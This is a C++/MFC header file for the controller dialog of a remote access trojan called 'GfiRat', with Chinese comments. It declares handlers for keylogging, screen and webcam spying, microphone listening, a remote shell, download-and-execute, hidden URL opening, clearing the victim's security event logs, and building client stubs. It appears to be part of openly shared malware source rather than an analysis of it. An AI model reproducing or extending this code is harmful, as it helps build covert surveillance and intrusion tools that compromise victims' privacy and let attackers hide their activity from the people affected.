
// GfiRatServerDlg.h: 头文件
//

#pragma once
#include "SEU_QQwry.h"

// CGfiRatServerDlg 对话框
class CGfiRatServerDlg : public CDialogEx
{
// 构造
public:
	CGfiRatServerDlg(CWnd* pParent = nullptr);	// 标准构造函数
	void Activate(UINT nPort, UINT nMaxConnections);
	void InsertLogItem(LPCTSTR Text, LPCTSTR Mode, int Flag);  //日志窗口插入数据
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	static void ProcessReceiveComplete(ClientContext* pContext);
	static void ProcessReceive(ClientContext* pContext);
	void SendSelectCommand(PBYTE pData, UINT nSize);
	BOOL m_bSetRestart;






// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_GFIRATSERVER_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:



	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	int nOSCount[11] = {0};        //系统分类数量
	SEU_QQwry* m_QQwry;          //ip位置
	HICON m_hIcon;
	CStatusBar	m_wndStatusBar; //状态栏
	CMenu m_Menu;               //菜单
	CListCtrl g_pLogView;  //日志列表
	CListCtrl g_pConnectView;  //客户列表


	CHeaderCtrl   m_header;
	afx_msg void OnCustomdrawList2(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRclickList2(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnEventCopy();
	afx_msg void OnEventDelete();
	afx_msg void OnEventSave();
	afx_msg void OnAllDelete();
	afx_msg void OnDeskLook(); //桌面截图预览
	afx_msg void OnFilemanager();
	afx_msg void OnKeyboard();
	afx_msg void OnScreenspy();
	afx_msg void Onnewscreenspy();
	afx_msg void OnSystem();
	afx_msg void OnWebcam();
	afx_msg void OnAudioListen();
	afx_msg void OnSpeakerListen();
	afx_msg void OnRemoteshell();
	afx_msg void OnSysinfo();
	afx_msg void OnRegedit();
	afx_msg void OnSermanager();
	afx_msg void OnProxy();
	afx_msg void OnJincheng();
	afx_msg void OnChuangkou();
	afx_msg void OnChongzhi();
	afx_msg void OnDownexec();
	afx_msg void OnUpdateServer();
	afx_msg void OnOpenUrlHide();
	afx_msg void OnOpenUrlShow();
	afx_msg void OnShowmsg();
	afx_msg void OnChat();
	afx_msg void OnCleanevent();
	afx_msg void OnCleanSystem();
	afx_msg void OnCleanSecurity();
	afx_msg void OnCleanApplication();
	afx_msg void OnIp();
	afx_msg void OnDilixinxi();
	afx_msg void OnAll();
	afx_msg void OnRemove();
	afx_msg void OnLogoff();
	afx_msg void OnReboot();
	afx_msg void OnShutdown();
	afx_msg void OnRenameRemark();
	afx_msg void OnChangeGroup();
	afx_msg void OnSelectAll();
	afx_msg void OnUnselectAll();
protected:
	afx_msg LRESULT OnAddfindgroup(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnRemovefromlist(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnAddtolist(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenshelldialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenmanagerdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenkeyboarddialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenscreenspydialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnNewopenscreenspydialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenpslistdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenwebcamdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenaudiodialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenspeakerdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpensysinfodialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenregeditdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenproxydialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenpserlistdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenchatdialog(WPARAM wParam, LPARAM lParam);



public:

	afx_msg void OnExit();
	afx_msg void OnClose();
	afx_msg void OnBuild();
	afx_msg void OnSetting();
	afx_msg void OnSize(UINT nType, int cx, int cy);
};
